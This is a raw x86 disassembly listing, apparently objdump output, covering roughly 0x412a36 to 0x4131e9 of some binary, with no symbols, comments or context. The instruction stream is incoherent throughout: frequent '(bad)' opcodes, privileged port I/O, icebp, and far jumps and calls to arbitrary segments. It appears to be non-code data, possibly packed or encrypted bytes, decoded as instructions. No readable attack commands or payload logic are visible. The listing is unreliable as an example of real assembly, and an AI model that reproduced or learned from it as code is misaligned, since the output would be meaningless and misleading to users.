  412a36:	dec    ebp
  412a37:	ja     0x412a83
  412a39:	stc    
  412a3a:	mov    ch,0x86
  412a3c:	sub    BYTE PTR [ebp+0x3f],ah
  412a3f:	data16 sbb BYTE PTR [edx],0xd8
  412a43:	sub    edi,DWORD PTR [eax+esi*1+0x9]
  412a47:	lods   al,BYTE PTR ds:[esi]
  412a48:	jge    0x412a3b
  412a4a:	mov    ds:0xd88874b4,eax
  412a4f:	jo     0x412aa3
  412a51:	sub    eax,0xe2beb1d5
  412a56:	pop    esi
  412a57:	(bad)  
  412a58:	mov    edx,0x903c8710
  412a5d:	dec    esi
  412a5e:	ret    
  412a5f:	ins    BYTE PTR es:[edi],dx
  412a60:	mov    esp,DWORD PTR [edx+eax*2-0x6757ebc9]
  412a67:	inc    ecx
  412a68:	out    dx,al
  412a69:	mov    ch,BYTE PTR [esi]
  412a6b:	or     bl,BYTE PTR [edi]
  412a6d:	or     eax,0x13e3e21c
  412a72:	aaa    
  412a73:	pop    es
  412a74:	lods   al,BYTE PTR ds:[esi]
  412a75:	test   BYTE PTR [eax],cl
  412a77:	bound  ebx,QWORD PTR [edi]
  412a79:	js     0x412aab
  412a7b:	push   0xcb1ad938
  412a80:	mov    ch,0xc3
  412a82:	mov    gs,WORD PTR [edx]
  412a84:	retf   0xd072
  412a87:	outs   dx,DWORD PTR ds:[esi]
  412a88:	cmp    DWORD PTR [edi-0x5ca1b8a1],0xb9a93aef
  412a92:	and    edx,eax
  412a94:	xchg   ebx,eax
  412a95:	xor    esp,DWORD PTR [edi-0x6f713607]
  412a9b:	cmp    bl,0xcd
  412a9e:	xor    cl,dh
  412aa0:	xchg   edx,eax
  412aa1:	and    ebp,DWORD PTR [esi-0x4ff4c328]
  412aa7:	xchg   ebx,eax
  412aa8:	sbb    BYTE PTR [edi+0x33],al
  412aab:	mov    cl,BYTE PTR [edi-0x1181ff4d]
  412ab1:	inc    esp
  412ab2:	(bad)  
  412ab3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ab4:	adc    al,BYTE PTR [ebx-0x5eb84c8b]
  412aba:	jns    0x412a61
  412abc:	neg    ah
  412abe:	test   BYTE PTR [ecx+eax*4-0x68],ah
  412ac2:	mov    esi,0x8864ba87
  412ac7:	std    
  412ac8:	sbb    bl,BYTE PTR [eax+0xa]
  412acb:	push   eax
  412acc:	push   0x904c5fc2
  412ad1:	xchg   edi,eax
  412ad2:	inc    edx
  412ad3:	imul   ecx,DWORD PTR [ecx-0x5347c79b],0xf62a01ac
  412add:	stos   DWORD PTR es:[edi],eax
  412ade:	cmp    ebx,ebp
  412ae0:	fwait
  412ae1:	pop    esp
  412ae2:	xor    ebx,esi
  412ae4:	mov    ecx,0x87d25196
  412ae9:	test   DWORD PTR [eax],eax
  412aeb:	fidiv  DWORD PTR [ebp+esi*4+0x14]
  412aef:	(bad)  
  412af1:	add    DWORD PTR ds:0x304a5f91,esi
  412af7:	jne    0x412ab6
  412af9:	mov    al,ds:0xe9b2a9f6
  412afe:	fnstcw WORD PTR [ecx+0x6e0ab821]
  412b04:	pop    edi
  412b05:	pop    eax
  412b06:	dec    eax
  412b07:	addr16 (bad) 
  412b09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412b0a:	mov    ?,WORD PTR [edi+0x4501352f]
  412b10:	cmp    ebx,ebp
  412b12:	sub    ebx,ebp
  412b14:	aas    
  412b15:	jne    0x412b94
  412b17:	mov    ecx,0x1ba662e3
  412b1c:	js     0x412af1
  412b1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b1f:	std    
  412b20:	inc    edx
  412b21:	inc    ecx
  412b22:	dec    edi
  412b23:	repz cmp eax,0x86f64f2e
  412b29:	jmp    0x633c:0x7b58e216
  412b30:	ret    0x9abd
  412b33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b34:	cli    
  412b35:	mov    al,0x7d
  412b37:	adc    esp,edi
  412b39:	jmp    0x412bab
  412b3b:	push   ebp
  412b3c:	inc    eax
  412b3d:	adc    esp,DWORD PTR [ebx]
  412b3f:	loope  0x412b5a
  412b41:	push   0x3856daff
  412b46:	mov    WORD PTR [ebx],?
  412b48:	mov    fs,WORD PTR [eax]
  412b4a:	inc    esi
  412b4b:	call   0x7c48:0xfd35c4f2
  412b52:	or     BYTE PTR [edi],ch
  412b54:	in     al,0xed
  412b56:	pop    edi
  412b57:	push   ss
  412b58:	imul   eax,DWORD PTR [ecx-0x27],0xfae98618
  412b5f:	cwde   
  412b60:	fwait
  412b61:	icebp  
  412b62:	mov    ebp,0xb733e495
  412b67:	xor    eax,0xeeddd98a
  412b6c:	pop    edx
  412b6d:	sbb    al,0xa3
  412b6f:	lods   eax,DWORD PTR ds:[esi]
  412b70:	out    0x8e,eax
  412b72:	fmul   DWORD PTR [ecx]
  412b74:	dec    edx
  412b75:	xor    BYTE PTR [ecx-0x5ce091e0],ch
  412b7b:	pushf  
  412b7c:	push   esi
  412b7d:	popf   
  412b7e:	mov    DWORD PTR [esp+edi*2],0xe029b46a
  412b85:	inc    edx
  412b86:	jno    0x412b7c
  412b88:	or     eax,0x1c53f245
  412b8d:	aas    
  412b8e:	dec    edi
  412b8f:	push   0xc793d072
  412b94:	jne    0x412bf9
  412b96:	arpl   WORD PTR [ebx+0x6664d4b2],cx
  412b9c:	mov    bl,0x9e
  412b9e:	push   ss
  412b9f:	mov    ebx,0x87fa39ad
  412ba4:	push   es
  412ba5:	out    0x1c,al
  412ba7:	cmp    BYTE PTR [edi-0x4d],cl
  412baa:	jmp    0x412bcf
  412bac:	push   ss
  412bad:	inc    ebp
  412bae:	stos   DWORD PTR es:[edi],eax
  412baf:	leave  
  412bb0:	or     eax,0x877f1355
  412bb5:	fwait
  412bb6:	mov    edx,0x1dd688a8
  412bbb:	mov    WORD PTR [edx+0x45e2f7bb],ds
  412bc1:	in     al,0x1d
  412bc3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412bc4:	rcl    BYTE PTR [edi+0x1402e86c],0x63
  412bcb:	fwait
  412bcc:	jae    0x412ba4
  412bce:	jecxz  0x412c27
  412bd0:	mov    ebp,0xa91c37d0
  412bd5:	add    al,BYTE PTR [ecx]
  412bd7:	(bad)  
  412bd8:	aam    0xab
  412bda:	mov    al,ds:0x3438128c
  412bdf:	jo     0x412bc1
  412be1:	or     ah,BYTE PTR [eax+0x3]
  412be4:	jb     0x412bc5
  412be6:	push   0xffffff8d
  412be8:	or     DWORD PTR [eax],0x7d4ebce6
  412bee:	mov    al,0x66
  412bf0:	cmp    DWORD PTR [eax],ebx
  412bf2:	xchg   esp,eax
  412bf3:	jnp    0x412bde
  412bf5:	call   0x288b:0x50d285d
  412bfc:	pop    ecx
  412bfd:	sbb    edi,DWORD PTR [edx]
  412bff:	fsubrp st(4),st
  412c01:	push   0xffffff88
  412c03:	jmp    0x412c40
  412c05:	repnz cmp al,0x6a
  412c08:	cmp    DWORD PTR [esi],0x65430e4d
  412c0e:	jecxz  0x412ba0
  412c10:	call   0x914a:0x6e522274
  412c17:	pop    ds
  412c18:	aaa    
  412c19:	nop
  412c1a:	jecxz  0x412c15
  412c1c:	in     eax,dx
  412c1d:	stc    
  412c1e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c1f:	out    dx,al
  412c20:	shr    BYTE PTR [eax],cl
  412c22:	frstor [ecx+0x62]
  412c25:	jmp    0xf9bb3857
  412c2a:	pop    ebp
  412c2b:	test   edx,esp
  412c2d:	aaa    
  412c2e:	adc    bl,BYTE PTR [ecx]
  412c30:	std    
  412c31:	out    0x35,eax
  412c33:	mov    ebx,0x4878bf5e
  412c38:	(bad)  [eax]
  412c3a:	outs   dx,DWORD PTR ds:[esi]
  412c3b:	mov    dh,0x5f
  412c3d:	cli    
  412c3e:	jo     0x412c65
  412c40:	jmp    DWORD PTR [edi+0x25ef7fbd]
  412c46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c47:	and    al,BYTE PTR [edi+0x18]
  412c4a:	pop    ebx
  412c4b:	frstor [ecx+edx*8+0xdda2201]
  412c52:	mov    eax,0xb5ef4958
  412c57:	data16 loopne 0x412c75
  412c5a:	inc    eax
  412c5b:	cmc    
  412c5c:	ret    
  412c5d:	or     eax,0x1c9e09bf
  412c62:	pop    ebp
  412c63:	fistp  QWORD PTR [ebx+0x31]
  412c66:	popa   
  412c67:	sub    edx,DWORD PTR [eax-0x678a4fc4]
  412c6d:	add    edi,DWORD PTR [edi+0x34]
  412c70:	aas    
  412c71:	pop    ebx
  412c72:	mov    al,ds:0xa2e76185
  412c77:	xor    al,0xd1
  412c79:	sbb    BYTE PTR [eax+0x4021a2f9],dl
  412c7f:	fcom   QWORD PTR [ecx-0xbb3e03]
  412c85:	out    0xb2,al
  412c87:	icebp  
  412c88:	and    BYTE PTR [ebp-0x142f33c0],ch
  412c8e:	jmp    0x412c15
  412c90:	(bad)
  412c94:	loopne 0x412c30
  412c96:	push   ss
  412c97:	inc    ecx
  412c98:	xchg   BYTE PTR [ebx-0x2a74633],ch
  412c9e:	data16 icebp 
  412ca0:	push   0x85d9316e
  412ca5:	pop    edi
  412ca6:	out    0xc6,al
  412ca8:	lods   eax,DWORD PTR ds:[esi]
  412ca9:	out    dx,eax
  412caa:	sbb    DWORD PTR [ecx],esi
  412cac:	and    edi,esp
  412cae:	sti    
  412caf:	push   ss
  412cb0:	ret    
  412cb1:	fwait
  412cb2:	addr16 and al,0xc3
  412cb5:	js     0x412cc8
  412cb7:	mov    al,ds:0x5e8e6c4
  412cbc:	jge    0x412ce6
  412cbe:	push   0x7aeb4e1e
  412cc3:	jmp    0xef8f:0x5cb3023
  412cca:	xlat   BYTE PTR ds:[ebx]
  412ccb:	mov    ebp,0x5b58ed5f
  412cd0:	inc    edi
  412cd1:	or     dl,bl
  412cd3:	inc    eax
  412cd4:	mov    DWORD PTR [esi+0x73],edi
  412cd7:	mov    cl,0xa8
  412cd9:	xchg   ecx,eax
  412cda:	pop    es
  412cdb:	(bad)  [ebx]
  412cdd:	add    al,0xf7
  412cdf:	scas   al,BYTE PTR es:[edi]
  412ce0:	retf   
  412ce1:	jae    0x412d0a
  412ce3:	cmp    esp,eax
  412ce5:	arpl   WORD PTR [esi],di
  412ce7:	dec    eax
  412ce8:	jmp    0x7027c7bb
  412ced:	lea    ebp,[esi-0x6b]
  412cf0:	outs   dx,BYTE PTR ds:[esi]
  412cf1:	iret   
  412cf2:	and    DWORD PTR [edx+0x29],ebx
  412cf5:	outs   dx,DWORD PTR ds:[esi]
  412cf6:	xor    ch,BYTE PTR [esi-0x26]
  412cf9:	outs   dx,DWORD PTR ds:[esi]
  412cfa:	push   esp
  412cfb:	call   0xc1c7:0x9b8bdc15
  412d02:	jae    0x412cc6
  412d04:	ds xchg ebx,eax
  412d06:	test   al,0x88
  412d08:	push   0x4d
  412d0a:	(bad)  
  412d0b:	push   ds
  412d0c:	sbb    al,0x43
  412d0e:	popf   
  412d0f:	ins    DWORD PTR es:[edi],dx
  412d10:	or     eax,0xffd83078
  412d15:	(bad)  [ebx+0x235eb763]
  412d1b:	xor    al,bh
  412d1d:	in     al,0xe8
  412d1f:	popf   
  412d20:	mov    ?,esp
  412d22:	in     al,0xf1
  412d24:	mov    dl,0x30
  412d26:	jge    0x412cb2
  412d28:	xchg   ecx,eax
  412d29:	imul   eax,edi,0xb4ad85aa
  412d2f:	rcl    DWORD PTR [edx],0x19
  412d32:	into   
  412d33:	jle    0x412ccd
  412d35:	cmp    al,0x58
  412d37:	das    
  412d38:	(bad)  
  412d39:	outs   dx,BYTE PTR ds:[esi]
  412d3a:	ds add cl,ch
  412d3d:	push   edi
  412d3e:	(bad)  
  412d3f:	pop    ebp
  412d40:	retf   
  412d41:	or     BYTE PTR [ebx-0x9494f8b],0x49
  412d48:	(bad)  
  412d49:	xlat   BYTE PTR ds:[ebx]
  412d4a:	ja     0x412d28
  412d4c:	push   esi
  412d4d:	xchg   ebp,eax
  412d4e:	test   dh,al
  412d50:	cmp    al,0xa8
  412d52:	and    dl,cl
  412d54:	mov    DWORD PTR [edi-0x73d16503],esp
  412d5a:	lea    esi,[ebp+0x68066f41]
  412d60:	xor    BYTE PTR [ecx-0x4a],bh
  412d63:	inc    esp
  412d64:	or     DWORD PTR [edx-0x1b],esi
  412d67:	cmp    edi,DWORD PTR [edi-0x5f0ca377]
  412d6d:	scas   al,BYTE PTR es:[edi]
  412d6e:	out    0x72,eax
  412d70:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412d71:	mov    DWORD PTR [ebx+0x3a457ef],ebx
  412d77:	xchg   esp,eax
  412d78:	and    eax,0xabe2bc37
  412d7d:	push   esp
  412d7e:	inc    edx
  412d7f:	cmp    ch,BYTE PTR [ebx]
  412d81:	mov    al,ds:0xb1ac648a
  412d86:	sub    DWORD PTR [edi+0xf761997],ebx
  412d8c:	or     BYTE PTR [ebp+edx*8+0x6cfc992f],dh
  412d93:	xor    ebx,ebx
  412d95:	bound  ebx,QWORD PTR [ebx-0x64390169]
  412d9b:	xlat   BYTE PTR ds:[ebx]
  412d9c:	pop    ebx
  412d9d:	cmp    bl,BYTE PTR [ebx-0x6e]
  412da0:	or     bl,BYTE PTR [edx+0x6722b042]
  412da6:	scas   eax,DWORD PTR es:[edi]
  412da7:	add    eax,0x892926c
  412dac:	jl     0x412de7
  412dae:	stos   DWORD PTR es:[edi],eax
  412daf:	out    0xf3,al
  412db1:	inc    edx
  412db2:	loop   0x412d4d
  412db4:	jns    0x412d5d
  412db6:	shl    DWORD PTR [edx+0x41],1
  412db9:	lds    edx,FWORD PTR [edx+0x47]
  412dbc:	sub    dl,BYTE PTR [esi-0x70]
  412dbf:	jns    0x412d73
  412dc1:	outs   dx,BYTE PTR ds:[esi]
  412dc2:	adc    eax,0x6e38521c
  412dc7:	push   edi
  412dc8:	fs dec eax
  412dca:	mov    dh,0xe
  412dcc:	sbb    eax,0xd932834e
  412dd1:	into   
  412dd2:	jns    0x1abc2731
  412dd8:	xlat   BYTE PTR ds:[ebx]
  412dd9:	adc    BYTE PTR [esi+ecx*8-0xf],dh
  412ddd:	mov    ebp,0x11aae6d9
  412de2:	adc    BYTE PTR [eax],ah
  412de4:	pop    esi
  412de5:	push   cs
  412de6:	mov    eax,DWORD PTR [eax+edi*4]
  412de9:	(bad)
  412dec:	xor    ebx,ebp
  412dee:	out    dx,eax
  412def:	iret   
  412df0:	sub    DWORD PTR [edi+0x59ffcbac],esp
  412df6:	call   0x5ef9:0x209ce234
  412dfd:	adc    eax,0xa130d11d
  412e02:	stos   BYTE PTR es:[edi],al
  412e03:	or     bl,BYTE PTR [ecx-0x36274d54]
  412e09:	es sub eax,0xee1ba112
  412e0f:	mov    edx,DWORD PTR ds:0x66310bc8
  412e15:	or     eax,DWORD PTR [edx+0x68]
  412e18:	loop   0x412e41
  412e1a:	test   al,dh
  412e1c:	test   eax,0x9cdf1695
  412e21:	outs   dx,DWORD PTR ds:[esi]
  412e22:	jge    0x412de5
  412e24:	iret   
  412e25:	inc    esi
  412e26:	jae    0x412e51
  412e28:	call   0x8891574b
  412e2d:	xlat   BYTE PTR ds:[ebx]
  412e2e:	add    dh,BYTE PTR [esi]
  412e30:	inc    DWORD PTR [ebp-0x53]
  412e33:	pop    esp
  412e34:	imul   BYTE PTR [esi-0x37]
  412e37:	retf   
  412e38:	cwde   
  412e39:	sbb    bl,ah
  412e3b:	adc    edi,DWORD PTR [ebx-0x44]
  412e3e:	lea    edi,[edi]
  412e40:	rcl    BYTE PTR [ebx+eax*2-0xe],0xf7
  412e45:	in     al,0x53
  412e47:	sub    al,0xa7
  412e4a:	add    ecx,DWORD PTR [ecx-0x3654e472]
  412e50:	sbb    dl,BYTE PTR [edi]
  412e52:	sub    BYTE PTR [ebx+0x293761b1],cl
  412e58:	sbb    eax,0xf4bed039
  412e5d:	in     al,dx
  412e5e:	mov    edx,0x944887e0
  412e63:	rcr    DWORD PTR [edx+0x579f8365],cl
  412e69:	cwde   
  412e6a:	pushf  
  412e6b:	aas    
  412e6c:	pop    ds
  412e6d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e6e:	xor    al,0x16
  412e70:	(bad)  
  412e71:	iret   
  412e72:	jno    0x412e6b
  412e74:	cmp    ecx,0x1c107efc
  412e7a:	sub    BYTE PTR [ecx+eiz*1+0x3b],cl
  412e7e:	les    edi,FWORD PTR [edx+0x6f648ee8]
  412e84:	popa   
  412e85:	inc    esi
  412e86:	add    DWORD PTR [eax-0x38c7ec9c],esi
  412e8c:	icebp  
  412e8d:	add    DWORD PTR [edx],esi
  412e8f:	(bad)  
  412e90:	(bad)  
  412e91:	pop    eax
  412e92:	ss and al,0x8f
  412e95:	or     ecx,DWORD PTR fs:[ebp+edi*1-0x4a929cbe]
  412e9d:	dec    ebx
  412e9e:	xchg   edi,eax
  412e9f:	xlat   BYTE PTR ds:[ebx]
  412ea0:	cmc    
  412ea1:	ret    0x8fd7
  412ea4:	and    al,BYTE PTR [ebx+0x606badf6]
  412eaa:	imul   edi,DWORD PTR [ebp-0x20],0x59
  412eae:	in     eax,dx
  412eaf:	mov    eax,0x792af2ec
  412eb4:	ins    BYTE PTR es:[edi],dx
  412eb5:	ja     0x412e58
  412eb7:	sub    al,0x5a
  412eb9:	mov    al,ds:0x71f8e70a
  412ebe:	ret    
  412ebf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412ec0:	cmp    eax,0xa927fdc1
  412ec5:	jmp    0x33a1:0x3fdf433
  412ecc:	icebp  
  412ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ece:	ret    0x6f15
  412ed1:	dec    ebp
  412ed2:	outs   dx,DWORD PTR ds:[esi]
  412ed3:	xor    DWORD PTR [eax+0x42],esp
  412ed6:	add    ch,bh
  412ed8:	fwait
  412ed9:	jle    0x412f24
  412edb:	shl    BYTE PTR [eax-0x4e],0xec
  412edf:	mov    ds:0x72783e3d,al
  412ee4:	ss rcl esp,0xfa
  412ee8:	dec    ebp
  412ee9:	jmp    0x2229:0x32db098a
  412ef0:	test   BYTE PTR [esi+edi*8],cl
  412ef3:	arpl   bp,cx
  412ef5:	(bad)  
  412ef6:	adc    bl,bl
  412ef8:	bound  ebx,QWORD PTR [ebx+0x7e7716ff]
  412efe:	pusha  
  412eff:	stc    
  412f00:	jne    0x412ea0
  412f02:	fs push ebx
  412f04:	cmp    BYTE PTR [ecx+eiz*2],0xf8
  412f08:	sbb    al,0x55
  412f0a:	push   0xffffff83
  412f0c:	mov    al,0x4
  412f0e:	inc    esp
  412f0f:	adc    eax,0xf385aa95
  412f14:	mov    eax,0xe149937d
  412f19:	push   edx
  412f1a:	mov    al,0xd3
  412f1c:	and    al,0x2f
  412f1e:	and    ebx,DWORD PTR [ebx-0x3f]
  412f21:	inc    ecx
  412f22:	pop    esp
  412f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f24:	aad    0x40
  412f26:	jbe    0x412f62
  412f28:	jae    0x412f0a
  412f2a:	pop    eax
  412f2b:	push   edi
  412f2c:	xlat   BYTE PTR ds:[ebx]
  412f2d:	rol    BYTE PTR ss:[ebp+0x26d75904],cl
  412f34:	push   ebx
  412f35:	jle    0x412f2b
  412f37:	daa    
  412f38:	sti    
  412f39:	aaa    
  412f3a:	push   edx
  412f3b:	loope  0x412f62
  412f3d:	mov    dl,0x8d
  412f3f:	pop    eax
  412f40:	jge    0x412ef7
  412f42:	xchg   ebx,eax
  412f43:	or     edi,DWORD PTR [edx-0x7b]
  412f46:	retf   0xb826
  412f49:	inc    ebp
  412f4a:	xor    DWORD PTR [ebp+ecx*1-0x2c],ebp
  412f4e:	sahf   
  412f4f:	mov    bl,0xc9
  412f51:	cli    
  412f52:	retf   
  412f53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412f54:	dec    eax
  412f55:	lds    ebp,FWORD PTR [ecx]
  412f57:	sbb    cl,al
  412f59:	in     eax,dx
  412f5a:	fs push edi
  412f5c:	push   ebx
  412f5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f5e:	and    cl,bh
  412f60:	dec    esi
  412f61:	cmp    eax,0xd6058009
  412f66:	xchg   edx,eax
  412f67:	pop    esi
  412f68:	popf   
  412f69:	dec    esp
  412f6a:	push   edx
  412f6b:	mov    edx,0x746e3ff6
  412f70:	dec    ebp
  412f71:	jo     0x412fd8
  412f73:	data16 rcl BYTE PTR [ebp-0x41cf6060],cl
  412f7a:	fsub   QWORD PTR [ebp+0xca3b847]
  412f80:	lods   eax,DWORD PTR ds:[esi]
  412f81:	xchg   edi,eax
  412f82:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412f83:	xchg   esp,eax
  412f84:	sbb    ah,bh
  412f86:	sub    ecx,edi
  412f88:	(bad)  
  412f89:	scas   al,BYTE PTR es:[edi]
  412f8a:	jmp    0x6ab5:0x370b70db
  412f91:	xchg   ebp,eax
  412f92:	imul   edi,DWORD PTR [edi],0x71
  412f95:	jo     0x412fb1
  412f97:	test   eax,0xc8feca8b
  412f9c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f9d:	(bad)  es:[eax+edx*2+0x50b668d3]
  412fa5:	neg    BYTE PTR [ebx+0x7b]
  412fa8:	leave  
  412fa9:	mov    esp,0xb11f855c
  412fae:	aad    0x9b
  412fb0:	push   0xffffff9a
  412fb2:	fidiv  DWORD PTR [edi]
  412fb4:	cld    
  412fb5:	mov    ebx,0x2e2b9f3c
  412fba:	mov    bh,BYTE PTR [eax-0x51cdadd2]
  412fc0:	into   
  412fc1:	jge    0x413025
  412fc3:	and    ch,dl
  412fc5:	jmp    0x412faa
  412fc7:	push   esi
  412fc8:	xchg   esp,eax
  412fc9:	mov    DWORD PTR [ecx-0x1b7a0471],ebx
  412fcf:	or     eax,0x29251457
  412fd4:	into   
  412fd5:	sub    BYTE PTR [edx],dl
  412fd7:	sub    edx,edx
  412fd9:	mov    esi,0x3c2bb17d
  412fde:	cmp    esp,ebx
  412fe0:	sbb    esi,esi
  412fe2:	fwait
  412fe3:	fwait
  412fe4:	ds cwde 
  412fe6:	and    eax,0x4a569491
  412feb:	cmp    cl,ch
  412fed:	xchg   edi,eax
  412fee:	jle    0x413008
  412ff0:	push   eax
  412ff1:	sbb    al,0x49
  412ff3:	sub    DWORD PTR [ebx+0x7f],0x81a5a3fd
  412ffa:	pop    esp
  412ffb:	jno    0x41306c
  412ffd:	mov    WORD PTR [edi-0x35],cs
  413000:	cmp    eax,0x8b633221
  413005:	(bad)  
  413006:	in     al,dx
  413007:	push   edi
  413008:	into   
  413009:	ror    BYTE PTR [ebp+0x6e],0xb2
  41300d:	cmp    BYTE PTR [edi-0x14],ch
  413010:	je     0x412fb1
  413012:	lahf   
  413013:	dec    eax
  413014:	xor    eax,0x581a833
  413019:	mov    bh,0x18
  41301b:	sub    BYTE PTR [edi-0x68f7c6fc],0x3e
  413022:	lods   al,BYTE PTR ds:[esi]
  413023:	in     eax,dx
  413024:	jbe    0x41301c
  413026:	mov    edx,0xc2236aff
  41302b:	in     al,0x5c
  41302d:	mov    ebp,0x795bb230
  413032:	loopne 0x412fe8
  413034:	imul   ecx,ebx,0x80587209
  41303a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41303b:	xchg   BYTE PTR [esi+eiz*8+0x40dbbfda],bl
  413042:	or     DWORD PTR [ebx+0x2a8476b7],eax
  413048:	add    al,0xad
  41304a:	sbb    esp,DWORD PTR [eax-0x32]
  41304d:	stc    
  41304e:	sahf   
  41304f:	pop    es
  413050:	jecxz  0x413073
  413052:	mov    dh,0x2a
  413054:	cld    
  413055:	rcr    DWORD PTR [ebp+0x10],0xaa
  413059:	xor    al,0xe1
  41305b:	loop   0x41301b
  41305d:	jp     0x413064
  41305f:	sbb    BYTE PTR [ebp-0x22],ch
  413062:	lods   eax,DWORD PTR ds:[esi]
  413063:	or     esp,edi
  413065:	and    eax,0x6582b988
  41306a:	pushf  
  41306b:	dec    edx
  41306c:	xchg   DWORD PTR [edx-0x1b67e128],ebx
  413072:	xchg   ebp,eax
  413073:	add    ecx,DWORD PTR [eax+0x3a7a31a4]
  413079:	add    ebp,DWORD PTR [edx]
  41307b:	std    
  41307c:	fstp   TBYTE PTR ds:0xe009bb3d
  413082:	xor    DWORD PTR [edx],edi
  413084:	sbb    ah,BYTE PTR es:[ebp-0x2a]
  413088:	js     0x4130d3
  41308a:	jne    0x41307b
  41308c:	dec    ebp
  41308d:	jae    0x4130bb
  41308f:	inc    eax
  413090:	sub    DWORD PTR ss:[esi-0x1a84745a],ebx
  413097:	lds    edx,FWORD PTR [esi]
  413099:	inc    ebp
  41309a:	inc    ecx
  41309b:	sbb    dh,BYTE PTR [ebx-0x1b02c1a9]
  4130a1:	cmp    edx,0x24
  4130a4:	cmp    BYTE PTR [eax+0x309026be],bl
  4130aa:	aad    0x9c
  4130ac:	or     eax,0xe673d262
  4130b1:	iret   
  4130b2:	test   BYTE PTR [eax-0x7a93bab2],dl
  4130b8:	and    DWORD PTR [bp+di-0x65],esp
  4130bc:	add    al,ah
  4130be:	push   esp
  4130bf:	and    ecx,ebx
  4130c1:	ror    BYTE PTR [ebx+0x29],0x7
  4130c5:	loopne 0x413088
  4130c7:	or     DWORD PTR [ecx+0x3aa9d622],ecx
  4130cd:	mov    ds:0xb1ab47d1,eax
  4130d2:	pop    edx
  4130d3:	cmp    al,0x66
  4130d5:	xchg   esp,eax
  4130d6:	shl    BYTE PTR [edx-0x1d],cl
  4130d9:	push   0x64
  4130db:	lods   al,BYTE PTR ds:[esi]
  4130dc:	adc    eax,0xc577ccbb
  4130e1:	idiv   DWORD PTR [edi-0x3ae2827b]
  4130e7:	retf   
  4130e8:	or     ah,BYTE PTR [esi-0x6d1999f]
  4130ee:	xchg   ebp,eax
  4130ef:	iret   
  4130f0:	mov    cl,0x95
  4130f2:	fimul  WORD PTR [edx+0x1bae3e06]
  4130f8:	mov    DWORD PTR [edi+0x69],edx
  4130fb:	aam    0x8f
  4130fd:	lahf   
  4130fe:	and    cl,0x1e
  413101:	push   esi
  413102:	js     0x41309a
  413104:	fiadd  WORD PTR [eax+0x32b26253]
  41310a:	push   ebx
  41310b:	in     eax,0xef
  41310d:	std    
  41310e:	xchg   esp,eax
  41310f:	das    
  413110:	lods   al,BYTE PTR ds:[esi]
  413111:	lock ret 
  413113:	sar    BYTE PTR [ebx-0x2b66dc56],1
  413119:	jecxz  0x41311a
  41311b:	pushf  
  41311c:	dec    esi
  41311d:	jle    0x413164
  41311f:	sub    DWORD PTR [eax+ecx*1],0x54
  413123:	xor    al,0x2
  413125:	test   eax,0x620e4a15
  41312a:	jl     0x4130f4
  41312c:	cmp    al,0xc0
  41312e:	dec    edx
  41312f:	cs popf 
  413131:	pusha  
  413132:	rol    BYTE PTR [eax-0x655bf28a],1
  413138:	aaa    
  413139:	ins    BYTE PTR es:[edi],dx
  41313a:	add    ebp,esp
  41313c:	xchg   edx,eax
  41313d:	inc    ecx
  41313e:	pop    ecx
  41313f:	aam    0x66
  413141:	mov    esi,0x482b1c2d
  413146:	cmp    al,0xd9
  413148:	jnp    0x4130f8
  41314a:	punpckldq mm0,mm4
  41314d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41314e:	dec    ecx
  41314f:	mov    gs,WORD PTR [eax-0x3ebf92c4]
  413155:	nop
  413156:	adc    DWORD PTR [ecx+0x76114b76],esp
  41315c:	jno    0x413166
  41315e:	fist   WORD PTR [esi]
  413160:	leave  
  413161:	mov    edi,0xf6e590d3
  413166:	leave  
  413167:	cmp    BYTE PTR [ebx],cl
  413169:	mov    edx,0x24321b6
  41316e:	(bad)  
  413170:	add    esi,esp
  413172:	sbb    al,0x1a
  413174:	dec    esp
  413175:	mov    bh,0x27
  413177:	jmp    0xa3f3067b
  41317c:	loop   0x41310c
  41317e:	cmp    edi,ecx
  413180:	inc    ecx
  413181:	push   ss
  413182:	adc    eax,0xc877066f
  413187:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413188:	int3   
  413189:	jb     0x41320a
  41318b:	add    eax,0xe0634125
  413190:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413191:	sub    al,0x82
  413193:	pushf  
  413194:	fild   DWORD PTR [ebx]
  413196:	sbb    BYTE PTR [esi+edi*8+0x1e35e14],cl
  41319d:	retfw  
  41319f:	sub    ebx,DWORD PTR [eax]
  4131a1:	adc    dl,BYTE PTR [ecx]
  4131a3:	scas   al,BYTE PTR es:[edi]
  4131a4:	jl     0x41321a
  4131a6:	inc    ebp
  4131a7:	lock add esi,ebp
  4131aa:	xchg   cl,dh
  4131ac:	popa   
  4131ad:	push   0x59f89d5f
  4131b2:	neg    DWORD PTR fs:[esi+edi*8+0x5ee5519d]
  4131ba:	push   ecx
  4131bb:	mov    al,0xc8
  4131bd:	inc    edi
  4131be:	jecxz  0x41323b
  4131c0:	xor    DWORD PTR [edi*1-0x11466b4],edi
  4131c7:	jecxz  0x4131c8
  4131c9:	or     BYTE PTR [ebx+ebp*2-0x38],ah
  4131cd:	stos   BYTE PTR es:[edi],al
  4131ce:	aam    0x30
  4131d0:	or     al,0xf6
  4131d2:	imul   ebp,DWORD PTR [ebx],0xe00b03cc
  4131d8:	(bad)  
  4131d9:	aam    0xd8
  4131db:	pop    ebx
  4131dc:	jmp    0xb056:0x7d1978dc
  4131e3:	dec    ebx
  4131e4:	jmp    DWORD PTR [ebx+0x7a]
  4131e7:	push   ebx
  4131e8:	ins    DWORD PTR es:[edi],dx
  4131e9:	pusha  
